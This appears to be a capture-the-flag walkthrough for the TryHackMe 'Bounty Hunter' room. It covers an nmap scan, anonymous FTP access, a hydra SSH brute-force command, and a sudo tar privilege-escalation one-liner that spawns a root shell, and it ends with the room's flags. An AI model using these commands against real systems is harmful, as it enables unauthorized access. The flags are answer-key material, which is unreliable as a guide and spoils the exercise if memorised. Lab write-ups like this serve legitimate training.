# Bounty_Hunter_THM

### Find open ports on the machine
    nmap -A -sV -O -T4 <IP> nmap 
  
### Who wrote the task list?
    Using nmap we can see that ftp is open so we can connect to that: ftp@<IP>\
    We then need to login as a user: anonymous\
    Using ls we find two file, locks.txt and task.txt\
    To view it we need to download to our directory: get task.txt, get locks.txt\
    Back in our directory we see we now have both files.\
    Let's print out the contents of the files: cat task.txt\
    Looking at the contents of the file of task.txt we see 2 task written by user lin. We now have a user to use.\
                                               1.) Protect Vicious.
                                               2.) Plan for Red Eye pickup on the moon.

                                               -lin
  
### What service can you bruteforce with the text file found?
    ssh
  
### What is the users password? 
    Printing out the contents of locks.txt we get a list of passwords.\
    Now with a user and a list of passwords we can use hydra to login with ssh.\
    hydra -t 16 -l lin -P locks.txt -vV <IP> ssh \
    We get the password RedDr4gonSynd1cat3
  
### user.txt
    Find the user.txt: find /home -name user.txt\
    The file is in /home/lin/Desktop/user.txt\
    Let's go over there and print to contents: We get THM{CR1M3_SyNd1C4T3}
 
### root.txt
    We see that we don't have permission to root\
    We can check of lin has any sudo commands she can run: sudo -l\
    Lin can run /bin/tar as root\
    Move over to /bin\
    Using GTFOBins we can elevate our privilege: https://gtfobins.github.io/gtfobins/tar/ : sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\
    Now that we have root we can get root.txt: THM{80UN7Y_h4cK3r}
    
    
  

    
    
